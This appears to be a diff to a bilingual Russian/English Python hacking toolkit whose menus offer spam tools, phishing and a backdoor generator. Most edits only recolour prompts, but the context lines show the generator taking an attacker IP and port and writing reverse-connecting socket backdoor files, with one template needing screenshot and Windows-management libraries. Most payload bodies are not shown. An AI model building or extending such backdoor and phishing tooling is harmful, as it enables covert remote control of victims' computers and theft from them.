@@ -83,32 +83,32 @@ def otv():
 	yes = {'yes','y', 'ye','ys','Y','Yes','YES','YE','YS','Да','ДА','Д','д','да','Yeah','YEAH','yeah'}
 	no = {'no','n','NO','No','N','Нет','нет','Н','н','НЕ','не','НЕТ','Не','Неа','НЕА','nope','Nope','NOPE'}
 
-	otvet = input('info~#:')
+	otvet = input('\033[31minfo\033[39m~#:')
 	if otvet in yes:
 		os.system("python defwak.py")
 	elif otvet in no:
-		print("\033[39mПрощайте!(Goodbye!)")
+		print("\033[32mПрощайте!(Goodbye!)")
 		raise SystemExit
 	else:
-		print("Дайте пожалуйста ответ(Please,give an answer)")
+		print("\033[33mДайте пожалуйста ответ(Please,give an answer)")
 		otv()
 def otv1():
 	yes = {'yes','y', 'ye','ys','Y','Yes','YES','YE','YS','Да','ДА','Д','д','да','Yeah','YEAH','yeah'}
 	no = {'no','n','NO','No','N','Нет','нет','Н','н','НЕ','не','НЕТ','Не','Неа','НЕА','nope','Nope','NOPE'}
 
-	otvet = input('info~#:')
+	otvet = input('\033[31minfo\033[39m~#:')
 	if otvet in yes:
 		DefSec4()
 	elif otvet in no:
-		print("\033[39mПрощайте!(Goodbye!)")
+		print("\033[32mПрощайте!(Goodbye!)")
 		raise SystemExit
 	else:
-		print("Дайте пожалуйста ответ(Please,give an answer)")
+		print("\033[33mДайте пожалуйста ответ(Please,give an answer)")
 		otv()
 def delete():
 	os.system('bash uninstall.sh')
 def DefSec0():
-	print("Прощайте!(Goodbye!)")
+	print("\033[32mПрощайте!(Goodbye!)")
 	raise SystemExit
 def DefSec1():
     os.system("python Spamers.py")
@@ -172,7 +172,7 @@ def DefSec4():
 	print(text)
 	back = int(input("\033[31mBackdoor\033[39m~#:"))
 	def Backdoor0():
-		print("\033[39mПрощайте!(Goodbye!)")
+		print("\033[32mПрощайте!(Goodbye!)")
 		raise SystemExit
 	def Backdoor1():
 		clean()
@@ -197,15 +197,15 @@ def DefSec4():
 		print(text1)
 		bdv1 = int(input('\033[31mBackdoor\033[39m~#:'))
 		def Backdoor0():
-			print("\033[39mПрощайте!(Goodbye!)")
+			print("\033[32mПрощайте!(Goodbye!)")
 			raise SystemExit
 		def Backdoor99():
 			DefSec4()
 		def BackdoorS():
 			os.chdir('USER-BD')
-			ip = input('Введите свой IP(Enter IP):')
-			pt = input('Введите порт(Enter Port):')
-			v = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
+			ip = input('\033[35mВведите свой IP(Enter IP):')
+			pt = input('\033[35mВведите порт(Enter Port):')
+			v = str(input('\033[35mИмя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			k = open(v,"w",encoding='utf-8')
 			k.write("""import socket, json
 #Хакер
@@ -289,9 +289,9 @@ class Backdoor:
 my_backdoor = Backdoor('"""+str(ip)+""", """+str(pt)+""") #ip хакера обезательно!
 my_backdoor.run() """)
 			n.close()
-			print('Готово!(Done!)')
-			print('Посмотрите в папке USER-BD')
-			print('Look in the USER-BD folder')	
+			print('\033[32mГотово!(Done!)')
+			print('\033[32mПосмотрите в папке USER-BD')
+			print('\033[32mLook in the USER-BD folder')	
 		if bdv1 ==1:
 			BackdoorS()
 		elif bdv1 ==2:
@@ -323,21 +323,21 @@ my_backdoor.run() """)
 		print(text2)
 		bdv2 = int(input('\033[31mBackdoor\033[39m~#:'))
 		def Backdoor0():
-			print("\033[39mПрощайте!(Goodbye!)")
+			print("\033[32mПрощайте!(Goodbye!)")
 			raise SystemExit
 		def Backdoor99():
 			DefSec4()
 		def Backdoor3():
-			textb = '''
-			Необходимо установить pyscreeze pywin32 WMI черeз pip
-			(You need to install pyscreeze pywin32 WMI through pip)'''
+			textb = ''' \033[33m
+Необходимо установить pyscreeze pywin32 WMI черeз pip
+(You need to install pyscreeze pywin32 WMI through pip)'''
 			
 			print(textb)
 		def Backdoor1():
 			os.chdir('USER-BD')
-			ipu = input('Введите свой IP')
-			ptu = input('Введите порт')
-			e = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
+			ipu = input('\033[35mВведите свой IP')
+			ptu = input('\033[35mВведите порт')
+			e = str(input('\033[35mИмя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			b = open(e,"w",encoding='utf-8')
 			b.write("""import socket, os, time, threading, sys
 from queue import Queue
@@ -548,14 +548,14 @@ def create_jobs():
 create_threads()
 create_jobs() """)
 			b.close()
-			print('Готово!(Done!)')
-			print('Посмотрите в папке USER-BD')
-			print('Look in the USER-BD folder')
+			print('\033[32mГотово!(Done!)')
+			print('\033[32mПосмотрите в папке USER-BD')
+			print('\033[32mLook in the USER-BD folder')
 		def Backdoor2():
 			os.chdir('USER-BD')
-			ipy = input('Введите свой IP')
-			pty = input('Введите порт')
-			q = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
+			ipy = input('\033[35mВведите свой IP')
+			pty = input('\033[35mВведите порт')
+			q = str(input('\033[35mИмя файла вашего бэкдора(File name of your backdoor) (file.py):'))
 			a = open(q,"w",encoding='utf-8')
 			a.write("""
 			# надо установить 
@@ -735,7 +735,9 @@ P.s Given which OS and commands you need to enter	'''
 	elif back == 4:
         	Backdoor4()
 	else:
-		print("Не найдено(Not found)")
+		print("\033[31mНе найдено(Not found)")
+		time.sleep(2)
+		DefSec4()
 def DefSec99():
 	clean()
 	texta = """
@@ -813,7 +815,7 @@ def DefSec6():
 	def phish99():
 		 os.system("python defwak.py")
 	def phish0():
-		print("\033[39mПрощайте!(Goodbye!)")
+		print("\033[32mПрощайте!(Goodbye!)")
 		raise SystemExit 
 	
 	if ph ==99:
@@ -821,7 +823,9 @@ def DefSec6():
 	elif ph ==0:
 		 phish0()
 	else:
-		print('Ошибка:не найдено(Error:not found)') 
+		print('\033[31mОшибка:не найдено(Error:not found)')
+		time.sleep(2)
+		DefSec6()
 def upmenu():
 	print("1-Termux  2-Linux")
 	ue = int(input("Что у вас?(What do you have?)"))
@@ -834,7 +838,8 @@ def upmenu():
 	    time.sleep(2)
 	    os.system('bash upgradeLinux.sh')
 	else:
-	    print('Ошибка:не найдено(Error:not found)')
+	    print('\033[31mОшибка:не найдено(Error:not found)')
+	    time.sleep(2)
 	    upmenu()
 	      
 if a ==0:
@@ -856,8 +861,8 @@ elif a ==99:
 elif a ==98:
   delete()
 elif a ==97:
-  DefSec97()
+  upmenu()
 else:
-	print('Ошибка:не найдено(Error:not found)')
+	print('\033[31mОшибка:не найдено(Error:not found)')
 	time.sleep(3)
 	os.system("python defwak.py")
